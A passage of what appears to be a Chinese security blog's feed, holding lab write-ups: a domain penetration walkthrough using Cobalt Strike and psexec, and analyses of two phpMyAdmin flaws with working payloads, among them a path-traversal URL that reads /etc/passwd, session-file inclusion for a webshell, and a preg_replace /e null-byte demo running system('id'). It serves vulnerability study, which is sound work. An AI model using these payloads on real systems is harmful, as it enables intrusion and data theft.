<a href="weblogic-wls-wsat-%e5%8f%8d%e5%ba%8f%e5%88%97%e5%8c%96%e6%bc%8f%e6%b4%9e.md">weblogic-wls-wsat-反序列化漏洞</a>
这个检测脚本卡主了,上一键利用工具了</p>
<p>CVE-2016-0638
<img loading='lazy' decoding="async" src="https://img.l1uyun.one/%e7%ba%a2%e6%97%a5%e9%9d%b6%e5%9c%ba2_win%e5%9f%9f_image_12.png" alt=""  /></p>
<p><img loading='lazy' decoding="async" src="https://img.l1uyun.one/%e7%ba%a2%e6%97%a5%e9%9d%b6%e5%9c%ba2_win%e5%9f%9f_image_13.png" alt=""  /></p>
<h3 id="antsword_内存马">antsword_内存马</h3>
<p>使用这个工具里面的内存马,上传antsword_Custom_Filter内存马</p>
<p><img loading='lazy' decoding="async" src="https://img.l1uyun.one/%e7%ba%a2%e6%97%a5%e9%9d%b6%e5%9c%ba2_win%e5%9f%9f_image_14.png" alt="|650"  /></p>
<p>进去之后查看ip,是存在内网环境的
<img loading='lazy' decoding="async" src="https://img.l1uyun.one/%e7%ba%a2%e6%97%a5%e9%9d%b6%e5%9c%ba2_win%e5%9f%9f_image_15.png" alt=""  /></p>
<h2 id="内网">内网</h2>
<p>这里还有一台PC机器是暴露在外网环境中的,但是已经拿了web机器的shell,就先进内网</p>
<h3 id="信息收集-1">信息收集</h3>
<p>局域网机器
<img loading='lazy' decoding="async" src="https://img.l1uyun.one/%e7%ba%a2%e6%97%a5%e9%9d%b6%e5%9c%ba2_win%e5%9f%9f_image_16.png" alt=""  />
本机信息
<img loading='lazy' decoding="async" src="https://img.l1uyun.one/%e7%ba%a2%e6%97%a5%e9%9d%b6%e5%9c%ba2_win%e5%9f%9f_image_17.png" alt=""  />
无法查看域用户
<img loading='lazy' decoding="async" src="https://img.l1uyun.one/%e7%ba%a2%e6%97%a5%e9%9d%b6%e5%9c%ba2_win%e5%9f%9f_image_18.png" alt=""  />
本地管理员组,这里面有域用户DE1AY\Domain Admins这个域用户
<img loading='lazy' decoding="async" src="https://img.l1uyun.one/%e7%ba%a2%e6%97%a5%e9%9d%b6%e5%9c%ba2_win%e5%9f%9f_image_19.png" alt=""  />
域信息
<img loading='lazy' decoding="async" src="https://img.l1uyun.one/%e7%ba%a2%e6%97%a5%e9%9d%b6%e5%9c%ba2_win%e5%9f%9f_image_20.png" alt=""  /></p>
<h3 id="cs上线">CS上线</h3>
<p>添加监听器</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>name：为监听器名字，可任意
</span></span><span style="display:flex;"><span>payload：payload类型
</span></span><span style="display:flex;"><span>HTTP Hosts: shell反弹的主机，也就是我们kali的ip（如果是阿里云，则填阿里云主机的公网ip）
</span></span><span style="display:flex;"><span>HTTP Hosts(Stager): Stager的马请求下载payload的地址（一般也是和上面的ip填一样）
</span></span><span style="display:flex;"><span>HTTP Port(C2): C2监听的端口
</span></span></code></pre></div><p><img loading='lazy' decoding="async" src="https://img.l1uyun.one/%e7%ba%a2%e6%97%a5%e9%9d%b6%e5%9c%ba2_win%e5%9f%9f_image_21.png" alt=""  />
创建payload
<img loading='lazy' decoding="async" src="https://img.l1uyun.one/%e7%ba%a2%e6%97%a5%e9%9d%b6%e5%9c%ba2_win%e5%9f%9f_image_22.png" alt=""  />
上传马子,将shell传到cs上
<img loading='lazy' decoding="async" src="https://img.l1uyun.one/%e7%ba%a2%e6%97%a5%e9%9d%b6%e5%9c%ba2_win%e5%9f%9f_image_23.png" alt=""  /></p>
<p>获取明文凭据
<img loading='lazy' decoding="async" src="https://img.l1uyun.one/%e7%ba%a2%e6%97%a5%e9%9d%b6%e5%9c%ba2_win%e5%9f%9f_image_24.png" alt=""  /></p>
<p>rdp也能连上去
<img loading='lazy' decoding="async" src="https://img.l1uyun.one/%e7%ba%a2%e6%97%a5%e9%9d%b6%e5%9c%ba2_win%e5%9f%9f_image_25.png" alt=""  />
噢,简称和完整域名的区别
<img loading='lazy' decoding="async" src="https://img.l1uyun.one/%e7%ba%a2%e6%97%a5%e9%9d%b6%e5%9c%ba2_win%e5%9f%9f_image_26.png" alt=""  /></p>
<h3 id="cs后渗透_横向移动">CS后渗透_横向移动</h3>
<p>上线cs之后,使用cs上面的横向移动模块中psexec就能解决掉剩下的两台机器了</p>
<p>域控
<img loading='lazy' decoding="async" src="https://img.l1uyun.one/%e7%ba%a2%e6%97%a5%e9%9d%b6%e5%9c%ba2_win%e5%9f%9f_image_27.png" alt=""  /></p>
<p>PC机器
<img loading='lazy' decoding="async" src="https://img.l1uyun.one/%e7%ba%a2%e6%97%a5%e9%9d%b6%e5%9c%ba2_win%e5%9f%9f_image_28.png" alt=""  /></p>
<h1 id="links">links</h1>
<p><a href="https://xz.aliyun.com/t/11676" target="_blank" rel="noopener nofollow noreferrer" >https://xz.aliyun.com/t/11676</a></p>
<p><a href="https://www.viewofthai.link/2022/09/11/" target="_blank" rel="noopener nofollow noreferrer" >https://www.viewofthai.link/2022/09/11/</a>红日att＆ck系列靶场（二）/</p>
<p><a href="https://github.com/Aedoo/CVE-2018-2628-MultiThreading" target="_blank" rel="noopener nofollow noreferrer" >CVE-2018-2628检测脚本</a></p>
]]></content>
            
                 
                    
                 
                    
                         
                        
                            
                             
                                <category scheme="https://l1uyun.one/tags/sec/win" term="sec/win" label="sec/win" />
                            
                        
                    
                
            
        </entry>
    
        
        <entry>
            <title type="html"><![CDATA[phpMyAdmin-4.0.x—4.6.2_远程代码执行漏洞]]></title>
            <link href="https://l1uyun.one/posts/phpmyadmin-4.0.x4.6.2_%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" rel="alternate" type="text/html" />
            
                <id>https://l1uyun.one/posts/phpmyadmin-4.0.x4.6.2_%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/</id>
            
            
            <published>2024-09-18T16:59:09+08:00</published>
            <updated>2024-09-20T14:55:49+08:00</updated>
            
            
            <content type="html"><![CDATA[<h2 id="漏洞简介">漏洞简介</h2>
<p>phpMyAdmin是一套开源的、基于Web的MySQL数据库管理工具。</p>
<p>在其查找并替换字符串功能中，将用户输入的信息拼接进preg_replace函数第一个参数中。
在PHP5.4.7以前，preg_replace的第一个参数可以利用\0进行截断，并将正则模式修改为e。众所周知，e模式的正则支持执行代码，此时将可构造一个任意代码执行漏洞。</p>
<h2 id="影响版本">影响版本</h2>
<p>// 漏洞涉及的组件,版本</p>
<p>phpmyadmin
4.0.x-4.0.10.16
4.4.x-4.4.15.7
4.6.x-4.6.3（实际上由于该版本要求PHP5.5+，所以无法复现本漏洞）</p>
<p>Php版本： 4.3.0 ~5.4.6
Php 5.5 版本以上的将 preg_replace 的 /e修饰符给废弃掉了</p>
<h2 id="利用条件">利用条件</h2>
<p>// 利用这个漏洞的前置要求,例如进后台啥的</p>
<p>这个漏洞需要登录，且要能够写入数据。</p>
<h2 id="前置知识">前置知识</h2>
<h3 id="preg_replace的e参数">preg_replace的/e参数</h3>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#a6e22e">mixed</span> <span style="color:#a6e22e">preg_replace</span> ( <span style="color:#a6e22e">mixed</span> <span style="color:#a6e22e">pattern</span>, <span style="color:#a6e22e">mixed</span> <span style="color:#a6e22e">replacement</span>, <span style="color:#a6e22e">mixed</span> <span style="color:#a6e22e">subject</span>,[<span style="color:#a6e22e">int</span> <span style="color:#a6e22e">limit</span>],[<span style="color:#a6e22e">int</span> <span style="color:#a6e22e">count</span>])
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>$pattern<span style="color:#f92672">:</span> <span style="color:#a6e22e">要搜索的模式，可以是字符串或一个字符串数组。反斜杠定界符尽量不要使用，而是使用</span> <span style="color:#75715e"># 或者 ~
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>$replacement<span style="color:#f92672">:</span> <span style="color:#a6e22e">用于替换的字符串或字符串数组。</span>
</span></span><span style="display:flex;"><span>$subject<span style="color:#f92672">:</span> <span style="color:#a6e22e">要搜索替换的目标字符串或字符串数组。</span>
</span></span><span style="display:flex;"><span>$limit<span style="color:#f92672">:</span> <span style="color:#a6e22e">可选，对于每个模式用于每个</span> <span style="color:#a6e22e">subject</span> <span style="color:#a6e22e">字符串的最大可替换次数。默认是</span><span style="color:#f92672">-</span><span style="color:#ae81ff">1</span><span style="color:#a6e22e">（无限制）。</span>
</span></span><span style="display:flex;"><span>$count<span style="color:#f92672">:</span> <span style="color:#a6e22e">可选，为替换执行的次数。</span>
</span></span></code></pre></div><p>/e 修正符使 preg_replace() 将 replacement 参数当作 PHP 代码(在适当的逆向引用替换完之后)。
提示：要确保 replacement 构成一个合法的 PHP 代码字符串，否则 PHP 会在报告在包含 preg_replace() 的行中出现语法解析错误。
例如,对于下面这个代码,访问h=phpinfo(),就能触发phpinfo页面</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">preg_replace</span>(<span style="color:#e6db74">&#34;/test/e&#34;</span>,<span style="color:#e6db74">&#39;phpinfo()&#39;</span>,<span style="color:#e6db74">&#34;jutst test&#34;</span>);
</span></span><span style="display:flex;"><span><span style="color:#75715e">?&gt;</span><span style="color:#960050;background-color:#1e0010">
</span></span></span></code></pre></div><p><img loading='lazy' decoding="async" src="https://img.l1uyun.one/phpMyAdmin_4.0.x%e2%80%944.6.2_%e8%bf%9c%e7%a8%8b%e4%bb%a3%e7%a0%81%e6%89%a7%e8%a1%8c%e6%bc%8f%e6%b4%9e_image_1.png" alt=""  /></p>
<h2 id="漏洞复现">漏洞复现</h2>
<p>//手测,脚本</p>
<p>使用的vulhub的环境,使用docker启动就行</p>
<p>这里是直接使用了exploit-db中的poc
<img loading='lazy' decoding="async" src="https://img.l1uyun.one/phpMyAdmin_4.0.x%e2%80%944.6.2_%e8%bf%9c%e7%a8%8b%e4%bb%a3%e7%a0%81%e6%89%a7%e8%a1%8c%e6%bc%8f%e6%b4%9e_image_2.png" alt=""  /></p>
<h2 id="漏洞分析">漏洞分析</h2>
<p>// 分析原理,调用链</p>
<p>参照网上其他人的分析文章,
首先找到preg_replace()函数的调用位置,
发现是在 /libraries/TableSearch.class.php 文件中的_getRegexReplaceRows方法里面</p>
<p><img loading='lazy' decoding="async" src="https://img.l1uyun.one/phpMyAdmin_4.0.x%e2%80%944.6.2_%e8%bf%9c%e7%a8%8b%e4%bb%a3%e7%a0%81%e6%89%a7%e8%a1%8c%e6%bc%8f%e6%b4%9e_image_3.png" alt=""  />
接下来就是依次寻找find,replaceWith和row[0]这三个参数的来源</p>
<p>可以看到find,replaceWith是直接从getReplacePreview中传递过去的
<img loading='lazy' decoding="async" src="https://img.l1uyun.one/phpMyAdmin_4.0.x%e2%80%944.6.2_%e8%bf%9c%e7%a8%8b%e4%bb%a3%e7%a0%81%e6%89%a7%e8%a1%8c%e6%bc%8f%e6%b4%9e_image_4.png" alt=""  />
继续往上查找getReplacePreview方法,发现是在tbl_find_replace.php中被调用的,这里的可以看到find,replaceWith都是直接从POST中传递进来的
<img loading='lazy' decoding="async" src="https://img.l1uyun.one/phpMyAdmin_4.0.x%e2%80%944.6.2_%e8%bf%9c%e7%a8%8b%e4%bb%a3%e7%a0%81%e6%89%a7%e8%a1%8c%e6%bc%8f%e6%b4%9e_image_5.png" alt=""  /></p>
<p>解决了前面两个参数,接下来就是看第三个参数是怎么来的,毕竟这个/e参数要成功执行代码,需要正则的模式被匹配到.</p>
<p>回到_getRegexReplaceRows方法,可以看到row[0]应该是sql语句查询结果的第一列数据
<img loading='lazy' decoding="async" src="https://img.l1uyun.one/phpMyAdmin_4.0.x%e2%80%944.6.2_%e8%bf%9c%e7%a8%8b%e4%bb%a3%e7%a0%81%e6%89%a7%e8%a1%8c%e6%bc%8f%e6%b4%9e_image_6.png" alt=""  />
<img loading='lazy' decoding="async" src="https://img.l1uyun.one/phpMyAdmin_4.0.x%e2%80%944.6.2_%e8%bf%9c%e7%a8%8b%e4%bb%a3%e7%a0%81%e6%89%a7%e8%a1%8c%e6%bc%8f%e6%b4%9e_image_7.png" alt=""  />
sql语句的内容如下</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span><span style="color:#66d9ef">SELECT</span> 
</span></span><span style="display:flex;"><span>    PMA_Util::backquote(<span style="color:#960050;background-color:#1e0010">$</span><span style="color:#66d9ef">column</span>),   <span style="color:#75715e">-- 获取列名并进行反引号处理
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#ae81ff">1</span>,                              <span style="color:#75715e">-- 添加一个额外的列，该列用于存储替换后的值
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#66d9ef">COUNT</span>(<span style="color:#f92672">*</span>)                        <span style="color:#75715e">-- 计算匹配的行数
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#66d9ef">FROM</span> 
</span></span><span style="display:flex;"><span>    PMA_Util::backquote(<span style="color:#960050;background-color:#1e0010">$</span>this<span style="color:#f92672">-&gt;</span>_db)   <span style="color:#75715e">-- 数据库名，反引号处理
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    .PMA_Util::backquote(<span style="color:#960050;background-color:#1e0010">$</span>this<span style="color:#f92672">-&gt;</span>_table) <span style="color:#75715e">-- 表名，反引号处理
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#66d9ef">WHERE</span> 
</span></span><span style="display:flex;"><span>    PMA_Util::backquote(<span style="color:#960050;background-color:#1e0010">$</span><span style="color:#66d9ef">column</span>)       <span style="color:#75715e">-- 目标列
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    RLIKE <span style="color:#e6db74">&#39;&#34; . PMA_Util::sqlAddSlashes($find) . &#34;&#39;</span>  <span style="color:#75715e">-- 使用正则匹配 $find，确保字符转义
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#66d9ef">COLLATE</span> <span style="color:#e6db74">&#34; . $charSet . &#34;</span>_bin      <span style="color:#75715e">-- 使用二进制排序规则进行区分大小写的比较
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#66d9ef">GROUP</span> <span style="color:#66d9ef">BY</span> 
</span></span><span style="display:flex;"><span>    PMA_Util::backquote(<span style="color:#960050;background-color:#1e0010">$</span><span style="color:#66d9ef">column</span>)       <span style="color:#75715e">-- 按目标列分组
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#66d9ef">ORDER</span> <span style="color:#66d9ef">BY</span> 
</span></span><span style="display:flex;"><span>    PMA_Util::backquote(<span style="color:#960050;background-color:#1e0010">$</span><span style="color:#66d9ef">column</span>) <span style="color:#66d9ef">ASC</span>   <span style="color:#75715e">-- 按目标列升序排列
</span></span></span></code></pre></div><p>这里面我们需要能够控制column,_db,_table,其中column是来自columnIndex这个参数,这个也是POST传进来的</p>
<p>剩下两个参数是PMA_TableSearch类的属性,是在构造函数里面被定义的
<img loading='lazy' decoding="async" src="https://img.l1uyun.one/phpMyAdmin_4.0.x%e2%80%944.6.2_%e8%bf%9c%e7%a8%8b%e4%bb%a3%e7%a0%81%e6%89%a7%e8%a1%8c%e6%bc%8f%e6%b4%9e_image_8.png" alt=""  />
继续回溯,tbl_find_replace.php中创建了这个类,并传入了$db, $table这两个参数
<img loading='lazy' decoding="async" src="https://img.l1uyun.one/phpMyAdmin_4.0.x%e2%80%944.6.2_%e8%bf%9c%e7%a8%8b%e4%bb%a3%e7%a0%81%e6%89%a7%e8%a1%8c%e6%bc%8f%e6%b4%9e_image_9.png" alt=""  />
这两个参数是包含的libraries/common.inc.php文件,这两个参数可以通过REQUEST方法来接收变量并将其设置为全局变量。
<img loading='lazy' decoding="async" src="https://img.l1uyun.one/phpMyAdmin_4.0.x%e2%80%944.6.2_%e8%bf%9c%e7%a8%8b%e4%bb%a3%e7%a0%81%e6%89%a7%e8%a1%8c%e6%bc%8f%e6%b4%9e_image_10.png" alt=""  /></p>
<p>结合上面的分析,看看exploit-db给的poc</p>
<p>使用poc,然后用burpsuite抓了一下包,脚本先是进行了登录
<img loading='lazy' decoding="async" src="https://img.l1uyun.one/phpMyAdmin_4.0.x%e2%80%944.6.2_%e8%bf%9c%e7%a8%8b%e4%bb%a3%e7%a0%81%e6%89%a7%e8%a1%8c%e6%bc%8f%e6%b4%9e_image_11.png" alt=""  />
前面两个数据包好像都是在获取一些Cookie信息,第一个是在登录获取token值,第二个包是在访问主页,获取了另外的一些值
<img loading='lazy' decoding="async" src="https://img.l1uyun.one/phpMyAdmin_4.0.x%e2%80%944.6.2_%e8%bf%9c%e7%a8%8b%e4%bb%a3%e7%a0%81%e6%89%a7%e8%a1%8c%e6%bc%8f%e6%b4%9e_image_12.png" alt=""  />
<img loading='lazy' decoding="async" src="https://img.l1uyun.one/phpMyAdmin_4.0.x%e2%80%944.6.2_%e8%bf%9c%e7%a8%8b%e4%bb%a3%e7%a0%81%e6%89%a7%e8%a1%8c%e6%bc%8f%e6%b4%9e_image_13.png" alt=""  />
第三个包访问了/import.php,这个文件是PhpMyAdmin中处理SQL导入的页面。这个页面允许管理员导入SQL查询语句，并在数据库中执行。</p>
<p>创建了一个数据库test,数据表prgpwn,以及插入了数据(<code>0/e\0</code>)  即0/e和一个null byte
<img loading='lazy' decoding="async" src="https://img.l1uyun.one/phpMyAdmin_4.0.x%e2%80%944.6.2_%e8%bf%9c%e7%a8%8b%e4%bb%a3%e7%a0%81%e6%89%a7%e8%a1%8c%e6%bc%8f%e6%b4%9e_image_14.png" alt="|900"  />
最后一个包,访问了漏洞所在的php文件,/tbl_find_replace.php</p>
<p>传入了db,table,find,replaceWith这些参数,find和replaceWith直接被拼接到了preg_replace的前面两个参数中,而POST的数据中的db,table,columnIndex指定了sql查询得到的结果,这个结果被拼接到了preg_replace的第三个参数,从而触发了preg_replace的/e参数的执行代码功能.
<img loading='lazy' decoding="async" src="https://img.l1uyun.one/phpMyAdmin_4.0.x%e2%80%944.6.2_%e8%bf%9c%e7%a8%8b%e4%bb%a3%e7%a0%81%e6%89%a7%e8%a1%8c%e6%bc%8f%e6%b4%9e_image_15.png" alt=""  />
find参数中传进去的%00也就是空字符,将拼接之后的/给截断了</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span>
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">echo</span> <span style="color:#a6e22e">preg_replace</span>(<span style="color:#e6db74">&#34;/0/e</span><span style="color:#ae81ff">\0</span><span style="color:#e6db74">/&#34;</span>,<span style="color:#e6db74">&#34;system(&#39;id&#39;)&#34;</span>,<span style="color:#e6db74">&#34;0/e</span><span style="color:#ae81ff">\0</span><span style="color:#e6db74">&#34;</span>)
</span></span><span style="display:flex;"><span><span style="color:#75715e">?&gt;</span><span style="color:#960050;background-color:#1e0010">
</span></span></span></code></pre></div><h2 id="漏洞修复">漏洞修复</h2>
<p>// 升级版本,打补丁,黑名单,白名单&hellip;..</p>
<p>及时更新版本。</p>
<h2 id="参考资料">参考资料</h2>
<p><a href="https://www.exploit-db.com/exploits/40185" target="_blank" rel="noopener nofollow noreferrer" >phpMyAdmin 4.6.2 - (Authenticated) Remote Code Execution - PHP webapps Exploit</a></p>
<p><a href="https://www.cnblogs.com/angly/p/3157736.html" target="_blank" rel="noopener nofollow noreferrer" >PHP安全之慎用preg_replace的/e修饰符 - y&rsquo;ang - 博客园</a></p>
<p><a href="https://xz.aliyun.com/t/7836" target="_blank" rel="noopener nofollow noreferrer" >CVE-2016-5734 phpmyadmin后台代码执行漏洞复现</a></p>
]]></content>
            
                 
                    
                 
                    
                         
                        
                            
                             
                                <category scheme="https://l1uyun.one/tags/sec/vulhub" term="sec/vulhub" label="sec/vulhub" />
                             
                                <category scheme="https://l1uyun.one/tags/sec/cve" term="sec/cve" label="sec/cve" />
                            
                        
                    
                
            
        </entry>
    
        
        <entry>
            <title type="html"><![CDATA[phpmyadmin-4.8.1远程文件包含]]></title>
            <link href="https://l1uyun.one/posts/phpmyadmin-4.8.1%E8%BF%9C%E7%A8%8B%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/" rel="alternate" type="text/html" />
            
                <id>https://l1uyun.one/posts/phpmyadmin-4.8.1%E8%BF%9C%E7%A8%8B%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/</id>
            
            
            <published>2024-09-18T15:33:13+08:00</published>
            <updated>2024-09-19T22:35:37+08:00</updated>
            
            
            <content type="html"><![CDATA[<h2 id="漏洞简介">漏洞简介</h2>
<p>phpMyAdmin是一套开源的、基于Web的MySQL数据库管理工具。其index.php中存在一处文件包含逻辑，通过二次编码即可绕过检查，造成远程文件包含漏洞。</p>
<p>这个漏洞刚刚打演练的时候用过,分析一下原理</p>
<h2 id="影响版本">影响版本</h2>
<p>phpmyadmin 4.8.0 &amp; 4.8.1</p>
<h2 id="前提条件">前提条件</h2>
<p>能够进入后台,也就是要有数据库的凭据</p>
<h2 id="前置知识">前置知识</h2>
<h3 id="php文件包含">php文件包含</h3>
<p>服务器执行PHP文件时，可以通过文件包含函数加载另一个文件中的PHP代码，并且当PHP来执行，这会为开发者节省大量的时间。
文件包含相关函数</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>require<span style="color:#f92672">()</span><span style="color:#75715e">#函数出现错误的时候，会直接报错并退出程序的执行</span>
</span></span><span style="display:flex;"><span>require_once<span style="color:#f92672">()</span><span style="color:#75715e">#只包含一次</span>
</span></span><span style="display:flex;"><span>include<span style="color:#f92672">()</span><span style="color:#75715e">#在包含的过程中如果出现错误，会抛出一个警告，程序继续正常运行</span>
</span></span><span style="display:flex;"><span>include_once<span style="color:#f92672">()</span><span style="color:#75715e">#只包含一次</span>
</span></span></code></pre></div><p>文件包含分为本地文件包含和远程文件包含</p>
<p>远程文件包含利用需要下面这两个配置文件都开启
当allow_url_include和allow_url_fopen都开启时，可以通过利用远程url或者php://协议直接getshell，即远程文件包含，
但allow_url_include在php5.2之后默认为off，利用机会有限。
<img loading='lazy' decoding="async" src="https://img.l1uyun.one/phpmyadmin-4.8.1%e8%bf%9c%e7%a8%8b%e6%96%87%e4%bb%b6%e5%8c%85%e5%90%ab_image_1.png" alt=""  />
当allow_url_include and allow_url_fopen均为off 在window主机环境下仍然可以进行远程文件执行，用445端口SMB协议进行远程加载。</p>
<h2 id="漏洞复现">漏洞复现</h2>
<p>直接访问下面的路径,能输出passwd内容那就是有了</p>
<p><code>/index.php?target=db_sql.php%253f/../../../../../../../../etc/passwd</code>
<img loading='lazy' decoding="async" src="https://img.l1uyun.one/phpmyadmin-4.8.1%e8%bf%9c%e7%a8%8b%e6%96%87%e4%bb%b6%e5%8c%85%e5%90%ab_image_2.png" alt=""  /></p>
<p>利用方式的话,就是先在sql栏执行一下select命令,然后去包含session文件,就能获得webshell,进而拿shell</p>
<p>可以执行一下<code>SELECT &lt;?=phpinfo()?&gt;;</code>，然后查看自己的sessionid（cookie中phpMyAdmin的值），然后包含session文件即可：</p>
<p>对应的sessions文件是 /tmp/sess_sessionid
<a href="phpmyadmin-4_8_1%e8%bf%9c%e7%a8%8b%e6%96%87%e4%bb%b6%e5%8c%85%e5%90%ab%e6%bc%8f%e6%b4%9e%ef%bc%88CVE-2018-12613%ef%bc%89.pdf">phpmyadmin-4_8_1远程文件包含漏洞（CVE-2018-12613）</a></p>
<h2 id="漏洞分析">漏洞分析</h2>
<p>简单来说就是phpmyadmin对用户传入的参数直接进行了包含,并且黑名单的检验不严格,可以绕过,从而导致了LFI</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#a6e22e">index</span><span style="color:#f92672">.</span><span style="color:#a6e22e">php</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">// If we have a valid target, let&#39;s load that script instead
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span> <span style="color:#66d9ef">empty</span>($_REQUEST[<span style="color:#e6db74">&#39;target&#39;</span>])
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&amp;&amp;</span> <span style="color:#a6e22e">is_string</span>($_REQUEST[<span style="color:#e6db74">&#39;target&#39;</span>])
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&amp;&amp;</span> <span style="color:#f92672">!</span> <span style="color:#a6e22e">preg_match</span>(<span style="color:#e6db74">&#39;/^index/&#39;</span>, $_REQUEST[<span style="color:#e6db74">&#39;target&#39;</span>])
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&amp;&amp;</span> <span style="color:#f92672">!</span> <span style="color:#a6e22e">in_array</span>($_REQUEST[<span style="color:#e6db74">&#39;target&#39;</span>], $target_blacklist)
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&amp;&amp;</span> <span style="color:#a6e22e">Core</span><span style="color:#f92672">::</span><span style="color:#a6e22e">checkPageValidity</span>($_REQUEST[<span style="color:#e6db74">&#39;target&#39;</span>])
</span></span><span style="display:flex;"><span>) {
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">include</span> $_REQUEST[<span style="color:#e6db74">&#39;target&#39;</span>];
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">exit</span>;
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># 黑名单
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>$target_blacklist <span style="color:#f92672">=</span> <span style="color:#66d9ef">array</span> (
</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#39;import.php&#39;</span>, <span style="color:#e6db74">&#39;export.php&#39;</span>
</span></span><span style="display:flex;"><span>);
</span></span></code></pre></div><p>然后就是在phpmyadmin中,执行sql语句之后,会存储在session文件中,如果包含这个文件,就能让select里面的php代码被执行</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>/index.php?target<span style="color:#f92672">=</span>db_sql.php?/../../../../../../../../etc/passwd
</span></span><span style="display:flex;"><span><span style="color:#75715e">#Windows环境下利用需要对?进行编码</span>
</span></span><span style="display:flex;"><span>/index.php?target<span style="color:#f92672">=</span>db_sql.php%253f/../../../../../../../../tmp/sess_21faa6130eaba2b5e04e313bfacc60d4
</span></span></code></pre></div><h2 id="漏洞发现">漏洞发现</h2>
<p>进入后台之后,查看版本信息</p>
<h2 id="漏洞修复">漏洞修复</h2>
<p>升级phpmyadmin版本</p>
<h2 id="相关漏洞">相关漏洞</h2>
<p><a href="phpMyAdmin-4.0.x%e2%80%944.6.2_%e8%bf%9c%e7%a8%8b%e4%bb%a3%e7%a0%81%e6%89%a7%e8%a1%8c%e6%bc%8f%e6%b4%9e.md">phpMyAdmin-4.0.x—4.6.2_远程代码执行漏洞</a></p>
<h2 id="漏洞总结">漏洞总结</h2>
<p>这个漏洞刚刚演练的时候利用过,比较熟悉了&hellip;
记忆这个漏洞</p>
<ul>
<li>组件:phpmyadmin</li>
<li>版本:4.8.1&amp;4.8.0</li>
<li>漏洞类型:文件包含</li>
</ul>
<p>假设你在尝试利用,挖掘这个漏洞</p>
<ul>
<li>漏洞产生点:首页的target参数</li>
<li>漏洞类型:文件包含</li>
<li>漏洞利用方法:通过对sessions文件进行包含从而实现rce</li>
<li>遇到问题之后的解决方案:</li>
</ul>
]]></content>
            
                 
                    
                 
                    
                         
                        
                            
                             
                                <category scheme="https://l1uyun.one/tags/sec/vulhub" term="sec/vulhub" label="sec/vulhub" />
                             
                                <category scheme="https://l1uyun.one/tags/sec/cve" term="sec/cve" label="sec/cve" />
                            
                        
                    
                
            
        </entry>
    
</feed>
